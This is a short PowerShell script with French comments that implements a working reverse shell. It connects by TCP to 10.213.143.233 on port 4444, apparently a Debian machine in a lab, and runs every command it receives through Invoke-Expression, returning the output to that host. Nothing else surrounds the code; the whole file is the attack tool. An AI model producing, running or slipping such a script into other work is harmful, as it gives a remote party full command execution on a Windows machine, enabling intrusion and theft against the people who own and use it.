$host_debian = "10.213.143.233"
$port = 4444

# Connexion TCP vers le Debian
$client = New-Object System.Net.Sockets.TCPClient($host_debian, $port)
$stream = $client.GetStream()

# I/O sur le flux
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)
$writer.AutoFlush = $true

$writer.WriteLine("=== Shell Windows connecte ===")

# Boucle principale de lecture/exécution des commandes
while($true) {
    $writer.Write("PS> ")
    $cmd = $reader.ReadLine()
    if ($cmd -eq "exit") { break }
    try {
        $out = Invoke-Expression $cmd 2>&1 | Out-String
    } catch {
        $out = $_.Exception.Message  # Retourne l'erreur si exception
    }
    $writer.WriteLine($out)
}

# Fermeture propre
$client.Close()
